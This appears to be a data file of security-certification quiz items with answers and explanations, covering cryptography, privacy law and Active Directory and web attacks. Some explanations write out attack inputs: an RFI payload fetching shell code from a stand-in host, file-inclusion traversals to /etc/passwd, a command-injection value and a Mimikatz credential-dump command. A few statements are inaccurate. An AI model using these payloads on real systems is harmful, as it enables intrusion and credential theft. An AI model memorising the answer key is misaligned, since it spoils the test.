  {id:713,domain:O,question:"What is a mean time between failures (MTBF) metric's security relevance?",options:["The average time between cyber attacks","For security hardware (HSMs, firewalls, IPS appliances), MTBF measures reliability — low MTBF means frequent failures that could create security gaps or single points of failure","The average time between security incidents","A measure of security team burnout"],answer:1,explanation:"Security appliances with low MTBF create availability risks — a failed IPS creates unmonitored network segments; redundancy (HA pairs) mitigates this but increases cost.",optionExplanations:["Cyber attack frequency is a different metric; MTBF measures hardware reliability.","MTBF for security infrastructure determines redundancy requirements — if a firewall MTBF is 3 years and availability requirements are 99.99%, the design must account for failures.","Security incident frequency metrics are different from hardware failure rates.","Team burnout is a personnel and process concern; MTBF is a hardware reliability metric."]},
  {id:714,domain:P,question:"What is a data protection authority (DPA) under GDPR?",options:["A database protection application","An independent public authority in each EU member state responsible for monitoring GDPR compliance, investigating complaints, and imposing fines for violations","A data protection application in an organization","An authority that approves data protection measures"],answer:1,explanation:"National DPAs (ICO in UK, CNIL in France, BfDI in Germany) enforce GDPR — they investigate complaints, conduct audits, issue guidance, and impose fines up to €20 million or 4% of global turnover.",optionExplanations:["Database applications are IT tools; DPAs are governmental regulatory authorities.","DPAs are the GDPR enforcement bodies — each EU member state has one, and they cooperate through the European Data Protection Board (EDPB) for cross-border cases.","Internal data protection functions are compliance departments; DPAs are external, independent governmental regulators.","DPAs enforce compliance rather than approve measures; they investigate violations and provide guidance."]},
  {id:715,domain:G,question:"What is ChaCha20-Poly1305?",options:["A cocktail-inspired encryption algorithm","A high-performance authenticated encryption cipher designed as an alternative to AES-GCM — particularly useful on devices without hardware AES acceleration, providing both encryption and authentication","A modified version of the AES algorithm","A 20-round block cipher"],answer:1,explanation:"ChaCha20-Poly1305 is faster than AES-GCM on devices without dedicated AES instructions (most ARM processors before AES-NI) — used in TLS 1.3, WireGuard, and QUIC protocols.",optionExplanations:["Cocktail inspirations are not cryptographic motivation; ChaCha is a stream cipher developed by Daniel Bernstein.","ChaCha20 provides the encryption (stream cipher), Poly1305 provides authentication (MAC) — together they provide AEAD (Authenticated Encryption with Associated Data) as an efficient alternative to AES-GCM.","AES-GCM and ChaCha20-Poly1305 are alternatives to each other; ChaCha20 is not based on AES.","ChaCha is a stream cipher, not a block cipher; the '20' refers to 20 rounds of the ChaCha core function."]},
  {id:716,domain:T,question:"What is credential theft via memory scraping?",options:["Scraping website credentials from browser history","Extracting authentication credentials from process memory — typically using tools like Mimikatz to extract NTLM hashes and Kerberos tickets from LSASS process memory on Windows systems","Physical memory damage causing credential loss","Automated credential brute force using scraped websites"],answer:1,explanation:"Mimikatz 'sekurlsa::logonpasswords' extracts all logged-in user credentials from LSASS — on unprotected Windows systems, this gives attackers all domain credentials in plaintext or hash form.",optionExplanations:["Browser history scraping is credential harvesting from stored passwords; memory scraping extracts from live process memory.","LSASS (Local Security Authority Subsystem Service) holds authentication credentials in memory for SSO functionality; Mimikatz and similar tools extract these for lateral movement.","Physical memory damage is hardware failure; memory scraping is a software-based credential extraction technique.","Brute force uses different techniques; memory scraping extracts credentials directly from authenticated process memory."]},
  {id:717,domain:A,question:"What is a network segmentation control benefit for ransomware?",options:["Ransomware cannot infect segmented networks","Proper network segmentation limits ransomware's ability to spread laterally — ransomware on a user workstation cannot directly reach backup servers, production databases, or other segments blocked by firewall rules","Segmentation prevents ransomware delivery","Segmented networks automatically detect ransomware"],answer:1,explanation:"NotPetya spread through flat networks at wired speed; organizations with proper segmentation (restricted SMB between segments) contained the spread while flat-network organizations were completely encrypted.",optionExplanations:["Ransomware can infect any reachable system; segmentation limits reachability.","Segmentation creates firewall-enforced boundaries that ransomware must cross — preventing automatic SMB spreading to backup servers or other segments limits the blast radius of a ransomware infection.","Segmentation doesn't prevent initial delivery (phishing still works); it limits post-infection spread.","Segmentation controls access paths; dedicated security tools detect ransomware activity."]},
  {id:718,domain:O,question:"What is a security awareness training frequency recommendation?",options:["Annual training is sufficient for all security topics","Regular (at least annual) baseline training with ongoing reinforcement through phishing simulations, targeted micro-learnings, and just-in-time training for high-risk situations provides the most effective results","Monthly comprehensive training sessions","Training only after security incidents occur"],answer:1,explanation:"Annual training alone creates knowledge decay — monthly phishing simulations, quarterly policy reminders, and event-triggered training (new threat, policy change) maintain security awareness throughout the year.",optionExplanations:["Annual-only training is the minimum compliance floor; effective programs reinforce continuously.","Security awareness research shows that combining periodic baseline training with frequent micro-reinforcements (simulated phishing, short video tips) dramatically outperforms annual-only approaches.","Monthly comprehensive training creates training fatigue and competes with work responsibilities; shorter, more frequent touchpoints are more effective.","Post-incident training is reactive and misses prevention opportunities; proactive ongoing training is more effective."]},
  {id:719,domain:T,question:"What is a kernel rootkit's detection challenge?",options:["Kernel rootkits are easy to detect with standard tools","Standard detection tools (process monitors, file browsers) rely on OS APIs that the rootkit has hooked and modified to hide malicious activity, making the OS itself untrustworthy for detection","Kernel rootkits only affect detection tool performance","Detection is straightforward using dedicated rootkit scanners"],answer:1,explanation:"To detect a kernel rootkit, you must boot from external media (bypassing the infected kernel) or use kernel-independent analysis tools that don't rely on OS APIs the rootkit has subverted.",optionExplanations:["Standard tools are exactly what kernel rootkits defeat; this is why they're so dangerous.","Kernel rootkits subvert the OS itself — the OS APIs that antivirus and process monitors use are modified to filter out rootkit artifacts, making the infected system report a false clean state.","Rootkits affect what tools report, not just performance; the OS returns fraudulent information about system state.","While rootkit-specific scanners exist, they must also contend with the compromised kernel; the most reliable detection requires offline analysis with a clean boot environment."]},
  {id:720,domain:G,question:"What is the security significance of hash output size?",options:["Larger hashes always process faster","Hash output size determines the collision resistance — a 128-bit hash has 2^64 expected operations to find a collision (birthday bound), while a 256-bit hash requires 2^128 operations","Hash output size has no security significance","Larger hashes provide better encryption strength"],answer:1,explanation:"SHA-256 has 2^128 birthday collision resistance; SHA-3-512 has 2^256 — SHA-1's 160-bit output provided only 2^80 collision resistance, which became feasible with sufficient computational resources.",optionExplanations:["Processing speed depends on algorithm implementation; hash output size primarily affects security properties.","The birthday bound means collision resistance is approximately 2^(n/2) for an n-bit hash — doubling the output size quadruples the bits needed to find collisions, dramatically increasing security.","Output size is the primary determinant of collision resistance; it directly affects the security level against birthday attacks.","Hashing and encryption are different; larger hash outputs provide better integrity protection, not encryption strength."]},
  {id:721,domain:T,question:"What is a Kerberoasting attack?",options:["Attacking Kerberos servers with fire","Requesting Kerberos service tickets for service accounts and cracking the TGS ticket offline to recover service account passwords — exploiting how Kerberos encrypts tickets with the service account's password hash","A brute force attack on Kerberos authentication","A network attack on Kerberos ports"],answer:1,explanation:"Any domain user can request service tickets; if the service account has a weak password, offline cracking of the NTLM hash in the ticket recovers the password — then the account is compromised.",optionExplanations:["Physical fire attacks are unrelated; Kerberoasting is an Active Directory credential attack.","Kerberoasting exploits Kerberos design — the TGS (Ticket Granting Service) ticket is encrypted with the service account's password hash, enabling offline cracking if the password is weak.","Brute force attacks the authentication endpoint; Kerberoasting extracts tickets for offline cracking without triggering authentication lockouts.","Port attacks are network-level; Kerberoasting is an Active Directory credential extraction technique."]},
  {id:722,domain:A,question:"What is an extended validation (EV) certificate?",options:["An extended-life SSL certificate","A high-assurance digital certificate requiring rigorous validation of the requesting organization's legal identity — formerly displayed with a green address bar, providing stronger identity assurance than DV/OV certificates","An encrypted validation certificate","A certificate that extends automatic certificate renewal"],answer:1,explanation:"EV certificates require CA verification of legal entity existence, physical address, domain ownership, and authorization — making them harder for phishing sites to obtain legitimately.",optionExplanations:["Extended-life certificates are long-validity certificates; EV is about verification rigor, not validity duration.","EV validation (taking days to weeks) verifies the organization's legal registration, jurisdiction, operational existence, and authorized requestor identity — providing higher assurance than domain-validated (DV) certificates.","Encrypted validation is not a certificate type; EV refers to the extensive validation process the CA performs.","Certificate renewal automation is a different feature; EV describes the validation level required to obtain the certificate."]},
  {id:723,domain:O,question:"What is log correlation in SIEM?",options:["Correcting errors in log files","Analyzing relationships between events across multiple log sources to identify attack sequences that span systems — connecting authentication events to subsequent file access to network activity","Correlating log file timestamps","Creating log summaries for compliance reporting"],answer:1,explanation:"SIEM correlation: 'IDS alert on port scan' + 'failed logins on web server' + 'successful login' + 'unusual database query' = likely SQL injection attack — no single event tells the story.",optionExplanations:["Log correction is log management; correlation is the security analysis of event relationships.","Log correlation connects events from different sources (firewall, AD, endpoint, database) into coherent attack narratives — recognizing that related events scattered across systems represent a coordinated attack.","Timestamp correlation is one aspect; log correlation is the broader analytical process of finding attack patterns across multiple event sources.","Compliance reporting may use correlated data; correlation's primary security purpose is threat detection through multi-source event analysis."]},
  {id:724,domain:T,question:"What is a file inclusion vulnerability?",options:["Including malicious files in an archive","A web vulnerability where applications include files based on user-controllable input — local file inclusion (LFI) reads server files; remote file inclusion (RFI) executes code from external URLs","Including security files in applications","A vulnerability in file compression algorithms"],answer:1,explanation:"LFI: '?page=../../../../etc/passwd' reads sensitive files; RFI: '?page=http://evil.com/shell.php' executes attacker's PHP code on the server — both stem from unsanitized file path input.",optionExplanations:["Archive file inclusion is a different concept; file inclusion vulnerabilities are web application flaws.","File inclusion vulnerabilities occur when web applications include files using paths derived from user input without proper validation — LFI reads local files; RFI includes and executes remote code.","Secure file inclusion practices address this; the vulnerability is in the implementation, not the concept.","Archive compression algorithms are different technologies; file inclusion is a web application input validation failure."]},
  {id:725,domain:G,question:"What is the role of entropy in password strength?",options:["Entropy measures password length only","Password entropy quantifies the unpredictability of a password — higher entropy (more bits) means more possible passwords of that pattern, making guessing harder — determined by character set size and length","Entropy measures how complex a password feels to type","All long passwords have high entropy"],answer:1,explanation:"'password' is 8 characters but low entropy (common word pattern). 'xK9#mQ2$' is also 8 characters but higher entropy (random, mixed character set). Entropy predicts guessing resistance.",optionExplanations:["Length is one factor; entropy combines length with character set size and pattern unpredictability.","Entropy = log2(character_set_size) × length for truly random passwords — 8 random lowercase letters = 8 × log2(26) ≈ 37.6 bits; 8 random printable characters = 8 × log2(95) ≈ 52.4 bits.","Typing complexity is subjective; entropy is a mathematical measure of information unpredictability.","Length affects entropy but doesn't guarantee it — 'aaaaaaaa' is long but predictable; entropy measures unpredictability within the password space."]},
  {id:726,domain:P,question:"What is a cookie consent mechanism under ePrivacy/GDPR?",options:["A form for ordering cookies online","A mechanism through which websites obtain informed consent from users before placing non-essential cookies on their devices — essential cookies are exempt; analytics, advertising, and tracking cookies require consent","A security mechanism for cookie authentication","An automatic consent to cookie storage on devices"],answer:1,explanation:"GDPR and ePrivacy Directive require freely given, specific, informed, unambiguous opt-in consent for non-essential cookies — pre-ticked boxes, cookie walls, and implied consent are non-compliant.",optionExplanations:["Food cookies are unrelated to web cookie consent mechanisms.","Cookie consent banners must present clear information about which cookies are used, for what purposes, and provide genuine choice — users must actively opt-in for non-essential cookies.","Authentication cookies are technical necessities exempt from consent requirements; consent applies to tracking and analytics cookies.","Automatic consent violates GDPR requirements; users must actively, knowingly agree to non-essential cookie placement."]},
  {id:727,domain:A,question:"What is a virtual LAN (VLAN) and its security function?",options:["A virtual local area network for virtual machines only","A logical network segment created on network switches that isolates traffic between groups of devices even when sharing physical infrastructure — providing network segmentation without separate physical equipment","A VPN for local network connections","A virtual network that exists only in cloud environments"],answer:1,explanation:"VLANs separate HR, Finance, Development, and Guest networks on the same physical switches — VLAN-aware switches enforce separation; inter-VLAN communication requires going through a router/firewall.",optionExplanations:["VLANs can include both physical and virtual devices; they're not exclusively for VMs.","VLANs provide logical segmentation on shared physical infrastructure — switch ports are assigned to VLANs, and traffic in one VLAN is invisible to devices in other VLANs without explicit routing.","VPNs create encrypted tunnels; VLANs create logical network isolation at the data link layer.","VLANs work on physical switches and are foundational to on-premises network segmentation; they're not exclusive to cloud environments."]},
  {id:728,domain:O,question:"What is a penetration testing rules of engagement?",options:["Rules governing competitive security team battles","A formal agreement defining exactly what the penetration tester is and isn't authorized to do — specifying allowed techniques, target systems, testing hours, emergency contacts, and stop conditions","Rules governing how penetration testers dress","A list of security test techniques available"],answer:1,explanation:"Rules of engagement prevent unauthorized testing — explicitly authorizing specific IPs, prohibiting production database modifications, defining blackout periods (no testing during business hours), and emergency abort conditions.",optionExplanations:["Competition rules are game structures; rules of engagement are formal legal authorizations.","Rules of engagement document the scope boundaries, permitted testing techniques, notification procedures, escalation contacts, and the conditions under which testing must immediately stop — protecting both the organization and testers.","Tester conduct is professional standards; rules of engagement are technical and legal authorization boundaries.","Available techniques catalog is separate; rules of engagement specifically authorize what's permitted for this specific engagement."]},
  {id:729,domain:T,question:"What is a Golden Ticket attack?",options:["Winning a security competition","Forging a Kerberos TGT (Ticket Granting Ticket) using the KRBTGT account's NTLM hash, allowing the attacker to impersonate any user and access any service in the domain — including domain admins — indefinitely","A golden key in cryptographic protocols","An attack on ticket printing systems"],answer:1,explanation:"Once an attacker has the KRBTGT hash (from DCSync or LSASS dump on a DC), they can create TGTs that impersonate any user, with any group memberships, for any duration — enabling complete persistent domain control.",optionExplanations:["Security competitions are CTF events; Golden Ticket is an Active Directory persistence attack.","Golden Tickets exploit Kerberos' trust in TGTs signed with the KRBTGT key — with that key, attackers create forged TGTs claiming administrator membership, valid until the KRBTGT password is rotated twice.","Cryptographic golden keys are different; Golden Ticket is specifically about Kerberos TGT forgery.","Physical ticket attacks are different; Golden Ticket attacks Active Directory's Kerberos authentication infrastructure."]},
  {id:730,domain:G,question:"What is a cryptographic protocol's role in secure communications?",options:["Protocols encrypt traffic automatically","A cryptographic protocol defines the rules and sequence of cryptographic operations that two parties must perform to achieve secure communication — specifying key exchange, authentication, and encryption algorithms","Protocols provide the encryption keys","A protocol is the key used in encryption"],answer:1,explanation:"TLS 1.3 specifies: handshake sequence (ClientHello, ServerHello, etc.), permitted cipher suites, key exchange methods, and record protocol for encrypting application data — all parties must implement the same protocol.",optionExplanations:["Traffic encryption is the result of executing the protocol; the protocol defines HOW to achieve secure communication.","Cryptographic protocols (TLS, SSH, IPsec) are standardized procedures specifying the sequence of messages, cryptographic operations, and algorithm choices that achieve mutually authenticated, encrypted communications.","Key generation happens within the protocol; the protocol doesn't provide pre-existing keys.","Keys are cryptographic material; protocols define the procedures for establishing and using those keys."]},
  {id:731,domain:T,question:"What is a pass-the-ticket attack?",options:["Passing a physical access ticket to an attacker","Stealing Kerberos TGT or TGS tickets from memory and using them to authenticate to services as the ticket's original owner without knowing the account's password","Passing authentication tokens through a network","A ticket spoofing attack in public transit systems"],answer:1,explanation:"Mimikatz can export valid Kerberos tickets from memory and import them on another machine — the attacker then uses these stolen tickets to access network resources as the original user.",optionExplanations:["Physical access tickets are physical security devices; pass-the-ticket is an Active Directory attack.","Pass-the-ticket differs from pass-the-hash — it uses actual Kerberos tickets rather than NTLM hashes, working in Kerberos environments where NTLM authentication is disabled.","Token passing is different; Kerberos tickets are specific credential artifacts stolen from process memory.","Public transit systems are completely different; Kerberos tickets are authentication artifacts in Windows environments."]},
  {id:732,domain:A,question:"What is a microservices security challenge compared to monolithic applications?",options:["Microservices are always more secure than monoliths","Microservices create an expanded attack surface with many inter-service communication endpoints, each requiring authentication and authorization, while the distributed nature makes centralized security controls more complex","Monolithic applications are inherently more vulnerable","Microservices have identical security requirements to monoliths"],answer:1,explanation:"A monolith has one auth boundary; a 100-service microservices architecture has 100 × (100-1) potential communication paths needing mTLS, authorization, and monitoring — a fundamentally different security challenge.",optionExplanations:["Microservices have different, often more complex security challenges; they're not inherently more or less secure.","Microservices expand the attack surface — each service is a potential target, inter-service API calls need authentication, and secret management must work across many services — requiring different approaches than monolithic security.","Monolithic applications have their own vulnerabilities; neither architecture is inherently more vulnerable.","Microservices have fundamentally different security requirements due to distributed design; centralized authentication, service mesh, and API security are crucial additions."]},
  {id:733,domain:O,question:"What is a security program's governance structure?",options:["The organizational chart of the security team","The framework of policies, roles, responsibilities, decision-making authorities, and oversight mechanisms that provide direction and accountability for information security — typically including board oversight, CISO accountability, and policy hierarchy","Physical security of governance documentation","A list of security procedures"],answer:1,explanation:"Effective governance: Board sets risk appetite → CISO translates to security strategy → policies flow from strategy → standards and procedures implement policies → audits verify compliance.",optionExplanations:["Team org charts are HR documents; governance is the broader accountability and decision-making structure.","Security governance provides the accountability structure — defining who's responsible for what, what decisions require what approvals, how risks are escalated, and how security performance is measured and reported.","Physical protection of documents is a security control; governance is the decision-making and accountability framework.","Procedures are one component; governance is the overarching structure that directs and controls the entire security program."]},
  {id:734,domain:P,question:"What is a sensitive data type requiring special handling?",options:["Any organizational data requiring protection","Categories of data whose exposure creates significant harm — PII (Social Security Numbers, birthdates), PHI (medical records), PCI data (credit card numbers), classified information, and intellectual property","Employee records requiring manager access","Data requiring more than two-factor authentication"],answer:1,explanation:"The combination of SSN + name + birthdate is sufficient for identity theft; credit card data enables fraud; medical records enable discrimination — sensitivity determines protection requirements.",optionExplanations:["All organizational data may require some protection; sensitive data categories are those whose exposure creates specific, significant harms.","Sensitive data is defined by the harm its exposure causes — regulatory penalties, fraud enablement, discrimination, identity theft, or national security impact — driving enhanced protection requirements.","Management access is a data access control decision; sensitivity is about the nature of the data and harm from exposure.","Authentication requirements flow from data sensitivity; the sensitivity category itself is determined by data type and exposure harm, not authentication requirements."]},
  {id:735,domain:G,question:"What is a side-channel attack's distinction from cryptanalysis?",options:["Side channels are faster attacks","Cryptanalysis attacks the mathematical algorithm; side-channel attacks exploit information leaked from the physical implementation — power consumption, timing, electromagnetic emissions, or acoustic signals","Side channels require physical access; cryptanalysis is remote","They are both forms of mathematical attacks"],answer:1,explanation:"AES is mathematically secure against cryptanalysis; but an AES implementation leaking different power patterns for 0 vs. 1 key bits enables differential power analysis (DPA) attacks — defeating the implementation, not the algorithm.",optionExplanations:["Speed is not the distinguishing factor; the type of information exploited differentiates these attack approaches.","Cryptanalysis finds mathematical weaknesses in the algorithm; side-channel attacks ignore the math and instead extract secret information from observable physical characteristics of execution.","Side-channel attacks can be remote (timing attacks over networks, acoustic attacks with microphones) and require no physical access in many cases.","Side-channel attacks are physical measurement attacks, not mathematical; they exploit implementation characteristics rather than algorithm weaknesses."]},
  {id:736,domain:T,question:"What is ARP poisoning (ARP spoofing)?",options:["Adding poison to network cables","Sending forged ARP (Address Resolution Protocol) replies to associate the attacker's MAC address with a victim's IP address, enabling man-in-the-middle attacks on local networks","Poisoning router ARP tables remotely","An attack on ARP server infrastructure"],answer:1,explanation:"ARP poisoning: attacker sends 'IP 192.168.1.1 is at MAC aa:bb:cc:dd:ee:ff' (attacker's MAC), machines update their ARP cache, and traffic meant for the router goes through the attacker first.",optionExplanations:["Cable poisoning is physical damage; ARP poisoning is a network protocol attack.","ARP has no authentication — anyone on a local network can send ARP replies claiming any IP-to-MAC mapping. Attackers exploit this to insert themselves in the traffic path between hosts.","ARP is a local network protocol; ARP poisoning works within the local broadcast domain, not remotely.","ARP has no centralized servers; ARP poisoning targets the cache tables maintained by individual hosts."]},
  {id:737,domain:A,question:"What is a security control's residual risk?",options:["Risk remaining in security controls","The risk that remains after security controls have been applied — the gap between total risk and the risk reduced by implemented controls — which must be accepted, transferred, or mitigated further","The cost of implementing security controls","Risk transferred to security vendors"],answer:1,explanation:"No control eliminates risk entirely — a firewall reduces network attack risk but doesn't eliminate it; the remaining probability of a successful attack through other means is residual risk.",optionExplanations:["Controls don't contain inherent risk; residual risk is about what remains after controls are applied.","Residual risk = Inherent risk - Risk reduced by controls. Organizations must decide whether to accept residual risk, transfer it (cyber insurance), or invest in additional controls to reduce it further.","Control implementation costs are a security investment consideration; residual risk is the remaining security exposure.","Transferred risk (cyber insurance) reduces financial impact of residual risk; residual risk is the remaining exposure after all controls are applied."]},
  {id:738,domain:O,question:"What is a managed security service provider (MSSP)?",options:["A provider that manages security budgets","A third-party company that provides outsourced security monitoring, incident detection, and response services — typically including 24/7 SOC services, security tool management, and threat intelligence","A provider managing physical security operations","A company that manages security certifications"],answer:1,explanation:"MSSPs (CrowdStrike Services, Trustwave, eSentire) offer 24/7 SOC-as-a-Service — particularly valuable for organizations that can't staff or afford their own security operations center.",optionExplanations:["Budget management is financial management; MSSPs manage security operations.","MSSPs provide outsourced security services — SIEM monitoring, EDR management, vulnerability management, incident response — allowing organizations to access enterprise-grade security capabilities without building them in-house.","Physical security operations companies are guard services; MSSPs focus on cybersecurity operations.","Certification management companies are training providers; MSSPs provide operational security services."]},
  {id:739,domain:T,question:"What is an OS command injection vulnerability?",options:["Injecting operating system updates","A vulnerability allowing attackers to execute arbitrary operating system commands through an application by inserting shell commands into application input that is passed to the OS command interpreter","An attack on operating system command centers","Injecting malicious code into OS update packages"],answer:1,explanation:"PHP: system('ping ' . $_GET['host']) — attacker inputs '127.0.0.1; cat /etc/passwd' and gets the password file back — OS command injection achieves full server compromise.",optionExplanations:["OS update injection would be a supply chain attack; command injection exploits application input handling.","OS command injection occurs when applications pass user input to shell commands without sanitization — attackers append operators (;, &&, |) to inject additional commands that execute with the application's privileges.","Command center attacks are different; OS command injection is a web application vulnerability.","Update package attacks are supply chain attacks; command injection exploits how running applications process user input."]},
  {id:740,domain:G,question:"What is a secure random number generator's importance in TLS?",options:["Random numbers make TLS sessions unique","TLS relies on cryptographically secure random number generation for session keys, nonces, and session IDs — weak randomness means these values are predictable, enabling session decryption and hijacking","Random numbers are only used for certificate generation","TLS doesn't use random numbers"],answer:1,explanation:"TLS client_random and server_random must be unpredictable — if they're predictable (as in the Debian OpenSSL bug), the master secret and all derived session keys become predictable and the session can be decrypted.",optionExplanations:["Uniqueness is a property; the critical requirement is unpredictability, not just uniqueness.","TLS handshake randomness (client_random, server_random) feeds the master secret derivation; weak randomness enables session key prediction and complete session decryption by passive observers.","Certificate generation uses randomness, but TLS protocol operation requires fresh randomness for every session.","TLS uses randomness extensively — session IDs, nonces, session ticket keys all require cryptographically secure randomness."]},
  {id:741,domain:T,question:"What is Kerberoasting?",options:["Attacking the Kerberos server directly","An attack technique requesting service tickets (TGS) for accounts with SPNs, then cracking the ticket encryption offline to recover service account passwords","Roasting network cables","A denial-of-service attack on authentication servers"],answer:1,explanation:"Any authenticated domain user can request a TGS for any SPN-registered service account, then crack it offline with hashcat — service accounts often have weak, never-changed passwords, making this a favorite post-compromise technique.",optionExplanations:["Kerberoasting doesn't attack the KDC directly; it abuses legitimate ticket-granting functionality.","Kerberoasting exploits the fact that TGS tickets are encrypted with the service account's password hash — any domain user can request these tickets and crack them offline without triggering lockouts.","This is not a real term; it's wordplay on Kerberos.","Kerberoasting is a credential theft technique, not a DoS attack — it doesn't disrupt availability."]},
  {id:742,domain:A,question:"What is an Extended Validation (EV) certificate?",options:["A certificate with a longer expiration date","A TLS certificate requiring the most rigorous identity verification process, displaying the organization's verified legal name, intended to provide the highest level of trust assurance","A certificate that extends to multiple domains","A backup certificate"],answer:1,explanation:"EV certificates require CAs to verify legal existence, physical address, and operational status of the organization — though browser UI no longer prominently displays EV status as it once did (green bar), reducing its practical user-facing value.",optionExplanations:["Expiration length is unrelated to validation level; EV is about identity verification rigor.","EV certificates undergo the strictest vetting (legal, physical, operational verification) compared to domain validation (DV) or organization validation (OV), though their visual trust indicators have been reduced in modern browsers.","Multi-domain coverage describes SAN/wildcard certificates, a separate certificate feature.","Backup certificates aren't a standard PKI concept; EV is about validation level."]},
  {id:743,domain:O,question:"What is log correlation in a SIEM?",options:["Storing logs in a single location","The process of analyzing and linking related log events from multiple sources to identify patterns, sequences, or relationships indicating a security incident that wouldn't be visible from any single log alone","Compressing log files for storage", "Deleting duplicate log entries"],answer:1,explanation:"Example: failed VPN login (firewall log) + new admin account created (AD log) + large file transfer (DLP log) from the same IP within 10 minutes — correlation rules link these into a single high-priority alert representing a likely compromise.",optionExplanations:["Centralized storage is log aggregation; correlation is the analytical linking of related events.","Correlation engines apply rules or analytics across multiple log sources to detect multi-stage attacks that look benign in isolation but form a clear attack pattern when combined.","Compression is a storage optimization; correlation is a detection technique.","Deduplication reduces noise but doesn't establish relationships between distinct events."]},
  {id:744,domain:T,question:"What is a Local File Inclusion (LFI) vulnerability?",options:["A vulnerability allowing local users to read any file","A web application flaw allowing attackers to include and execute files already present on the local server by manipulating file path input, potentially exposing sensitive files or achieving code execution","Excluding local files from backups","A vulnerability in local network file shares"],answer:1,explanation:"Example: include($_GET['page'] . '.php') allows ?page=../../../etc/passwd%00 (with null byte bypass) to read sensitive files, or combined with log poisoning to achieve remote code execution.",optionExplanations:["LFI is a web application vulnerability exploited remotely through crafted requests, not a local user privilege issue.","LFI occurs when applications use unsanitized user input to construct file paths for inclusion (PHP include/require), allowing path traversal to read configuration files or, combined with file upload, achieve RCE.","Backup exclusion is unrelated; LFI is a code execution/disclosure vulnerability.","LFI targets the web application's file inclusion mechanism, not network file share protocols."]},
  {id:745,domain:G,question:"What is password entropy?",options:["The physical energy required to type a password","A measure of password unpredictability/randomness expressed in bits, indicating how resistant a password is to guessing or brute-force attacks — higher entropy means more possible combinations an attacker must try","The rate at which passwords expire","The number of characters in a password"],answer:1,explanation:"Entropy = log2(possible combinations) — a random 12-character password from a 95-character set has ~79 bits of entropy, while 'Password123!' has much lower effective entropy despite meeting complexity rules, because it follows predictable patterns.",optionExplanations:["Entropy is an information theory concept, not physical energy.","Password entropy quantifies randomness in bits — NIST and security guidance increasingly favor entropy-based strength measures over simple complexity rules, since predictable patterns reduce effective entropy regardless of character variety.","Expiration rate is password aging policy, unrelated to entropy/strength.","Length contributes to entropy but isn't the same measure — a long but predictable password can have low entropy."]},
  {id:746,domain:P,question:"What is a cookie consent mechanism required for under privacy regulations like GDPR?",options:["Making cookies taste better","A mechanism requiring websites to obtain explicit, informed user consent before setting non-essential cookies (tracking, advertising, analytics) and providing clear opt-out options","Encrypting all cookies automatically","Disabling all cookies by default permanently"],answer:1,explanation:"GDPR and ePrivacy Directive require granular consent (not just an 'I agree' banner) — users must be able to accept/reject categories of cookies separately, and consent must be as easy to withdraw as to give.",optionExplanations:["This is wordplay, not a real concept.","GDPR-compliant cookie consent requires opt-in (not opt-out) for non-essential cookies, granular category choices, and equally easy withdrawal — pre-ticked boxes and forced consent walls violate the regulation.","Cookie consent is about user permission for data collection, not encryption.","Essential/functional cookies required for site operation don't need consent; the requirement targets tracking/marketing cookies specifically."]},
  {id:747,domain:A,question:"What is the purpose of a Virtual LAN (VLAN)?",options:["To create a virtual reality network experience","To logically segment a physical network into multiple separate broadcast domains, improving security isolation and traffic management without requiring separate physical infrastructure","To virtualize LAN cables","To increase network cable length"],answer:1,explanation:"VLANs (802.1Q tagged) let one physical switch infrastructure support separate logical networks — finance traffic stays isolated from guest WiFi traffic even though they may traverse the same physical switches, requiring a router/L3 switch to communicate between VLANs.",optionExplanations:["VR is unrelated; VLAN stands for Virtual Local Area Network, a network segmentation technology.","VLANs provide logical segmentation — broadcast domain isolation, traffic management, and a security boundary — using shared physical hardware, reducing both cost and attack surface from network segmentation.","Cables aren't virtualized; VLANs are a logical/software construct operating on physical switch hardware.","VLANs don't affect physical cable length/distance limitations; that's a Layer 1 concern."]},
  {id:748,domain:O,question:"What are 'rules of engagement' in a penetration test?",options:["Marketing rules for the testing company","A formal document defining the scope, boundaries, timing, authorized techniques, emergency contacts, and limitations of a penetration test, agreed upon before testing begins","Rules for hiring penetration testers","Legal rules governing all cybersecurity work"],answer:1,explanation:"RoE specifies what's in/out of scope (specific IPs, systems excluded), testing windows (avoid business hours for critical systems), permitted techniques (social engineering allowed? DoS testing allowed?), and emergency stop procedures — without RoE, testers could face legal liability or cause unintended outages.",optionExplanations:["RoE isn't about marketing; it's a technical/legal scoping document.","RoE establishes the authorized scope and boundaries of testing — protecting both the tester (legal authorization, CFAA defense) and the client (preventing unauthorized actions or unexpected outages).","Hiring practices are separate from RoE, which governs the conduct of an already-engaged test.","RoE is specific to each engagement, not a general legal framework for all cybersecurity work."]},
  {id:749,domain:T,question:"What is a Golden Ticket attack?",options:["Winning a security conference prize","An attack where adversaries who have compromised the KRBTGT account hash forge Kerberos Ticket Granting Tickets (TGTs) granting unrestricted, persistent domain access as any user, including non-existent ones","A legitimate VIP access ticket","An attack on physical access control tickets"],answer:1,explanation:"With the KRBTGT hash, attackers can forge TGTs valid for any user (including ones that don't exist) with any group membership, for up to 10 years by default — making Golden Tickets one of the most severe Active Directory persistence mechanisms, requiring KRBTGT password reset (twice) to remediate.",optionExplanations:["This is wordplay, not a real concept.","Golden Ticket attacks represent near-total and persistent domain compromise — because the forged TGT is cryptographically valid, it bypasses normal authentication checks and even survives individual account password resets.","This describes a legitimate ticket, not the malicious forged Kerberos ticket attack.","This isn't physical access control; it specifically targets Kerberos authentication infrastructure in Active Directory."]},
  {id:750,domain:G,question:"What is the difference between symmetric and asymmetric cryptographic key exchange in TLS?",options:["There is no difference, they are the same thing","Symmetric key exchange uses the same pre-shared key for all sessions, while asymmetric (like Diffie-Hellman or RSA key exchange) establishes a unique session key per connection without requiring a pre-shared secret","Asymmetric is always faster", "Symmetric is only used for authentication"],answer:1,explanation:"TLS uses asymmetric cryptography (RSA or ECDHE) during the handshake to securely establish a shared symmetric session key, then switches to fast symmetric encryption (AES) for the actual data — combining asymmetric's secure key establishment with symmetric's performance.",optionExplanations:["They are fundamentally different mechanisms with different security properties and use cases within TLS.","TLS's hybrid approach uses asymmetric algorithms to solve the key distribution problem (no pre-shared secret needed) before switching to symmetric encryption for bulk data due to its superior performance.","Symmetric encryption is faster for bulk data; asymmetric is computationally expensive, which is why TLS uses it only for the handshake.","Symmetric algorithms (AES) are used for confidentiality/encryption of data, not primarily for authentication, which uses asymmetric signatures/certificates."]},
